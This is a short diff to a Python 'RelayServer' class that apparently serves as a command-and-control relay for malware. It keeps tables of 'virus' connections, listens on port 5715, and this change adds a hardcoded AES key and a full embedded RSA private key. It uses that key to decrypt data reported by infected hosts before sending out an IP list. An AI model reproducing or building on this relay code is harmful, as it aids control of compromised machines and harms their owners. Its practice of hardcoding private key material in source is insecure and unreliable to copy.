@@ -11,6 +11,9 @@ class RelayServer:
         self.toClient = {}
         self.toVirus = {}
 
+        self.AESKey = '\x40\x73\x8A\xC7\x8F\x0F\xD5\xEF\x02\x57\xB2\xE1\x9B\x83\x04\x15'
+        self.RSAPrivateKey = '-----BEGIN RSA PRIVATE KEY-----\nMIIEogIBAAKCAQEAonQkIgH5+WBaEGAfqH6JGW3M7vYwPCHz9tmz1ToH82YVDBaX\n9qNUxJRs3t5QNrvgNo9Dfem6nnXpgIdSykheO1EB2CVJ2Z92bewBmYu8Pda3BOUR\nq0mi1gsn5fna3JVyQkB/gElSld0elQ5BubKn6wCh3tCWj8FS66DY8U9f6aeRMN1Q\nBPPprd1zsbixafeLg5Cc+utIXCtRTZDeCL2d7pccI276OC2r7GHwMUAsFqdYpva2\nW4PmC+AHe9eZk9FknCc/pXD8AdeUccDAZ7wRo/VFqbKCQR6Ei6ooUFXGEXdJU9tE\nuxPYb+CM1uGjEyqvuDGvUJS+fbOtMhM1L/kSKwIDAQABAoIBAEEdpoIPIsCHk3Iu\n5WGnXpLXxSYffhQMU/qlJoUYXql8SIFw6PaOX2LwT3dByws1YVjdMeNddVUg1DiV\nhWTZfxPtk3ys7Z4SYekLiVSfgxOSZgfLPbrXqDJ9hD+VV9nE+Wh+69xjB3xUhnae\noU+qwc3bkgZ6u27hwbf64BpRg5Nm2LgGVOvaJmbSCR5/llR7bWYPBqChmRKG9cah\nLPhBxuRJoj+C7MU0zFLWi441p3w1OnrpjTJSreb0vqAzWSn1/DjigUUYKq4ifgoJ\nnjx+ymNKP7XOK+/+TKqJw0MXoYRhdxbQiWV4/yATSs0PR8hWbFOcsG5su/JhSR8A\nZYmEKpECgYEAyb4SKdHMonK6lfkXux6lv1sBqltxx5hLYlm8Glsmn8pu8bUrDk+y\nFPEgVkeQrB462wcjBTbUm20+saiUMR+RwJ3KNbU/qSt/GTXTl1KbUePdb1/ccczk\nLZ1njhy+KrtIYXXOpXbzn6SbIiGhQkE9zXYc1Jdm+5HaxRYyMY6n8jMCgYEAziUL\neoi5+OD81yXMfIQUI9UYY5+UYixfohrVFwGT1/LcIyFLh6WdUquW6HFtGSOZL5KX\nq2AS720ql69IqD52clAtmNj+mfItNd8WBRyGPO2ldMaxyPDyPzjOx/UOt81517xz\neOYPZUVgRDNnaOcSGEGzhIPcRvCrQTKokuCnmCkCgYAWaPa7joKcyQHRBwqLzqu6\nxfE5a08ITPKSykUK6HUx6trIHsfZnyC5Es/0xZ5cgD8pdXF+csjLOydrtL5BdrBK\nJT0BGlEoCZzkwAXxGUwHnLhMVum1+nyeVI3cS3UUahlwOhXqa3xEj5RsBjBTm8ux\ntx0cwHTAHUOgAQcyWhZt4QKBgB+eRvhwaDXoLF/DiG3AxGYKlUcSfuvf6nsuqmhw\n8YA529H3lWIk4NCBSRA19YnZj/FgBqtefQkEMXg6hmZnzjsSWSwMfGCYaJ7OrM3z\n5hMKUEps/2/WpRFVYUICMFO4zGtumDd+8fWSgoVzbPUGHBxkV2iH4Q1wdJP3dSuy\nEYKhAoGAKyPQQcKZeBhfoAhBXY+caMUlXEsYjqqbYCDJaCuK8n72u3hxDMlrSWjD\nHBjGPo0fXB5nQC2S1U7V0qS4C7Wc8tK0V0BddvHka/uSpm4ZkQIhiVt78oKem3Gv\nJUE68gUDONxhyQsBpfI93Kfl2lD7TsKh5SlZxxvgLDwZJDck/Qo=\n-----END RSA PRIVATE KEY-----'
+
     def runVirus(self):
         host = '0.0.0.0'
         port = 5715 
@@ -88,6 +91,7 @@ class RelayServer:
                     raise
             if pkt.state == '100':
                 tup = self.toVirus[address[0]]
+                pkt.RSADecryptData(self.RSAPrivateKey)
                 self.toVirus[address[0]] = (tup[0],tup[1],pkt.data)
                 self.sendIPList()
             else: self.enqueueToClient(pkt)
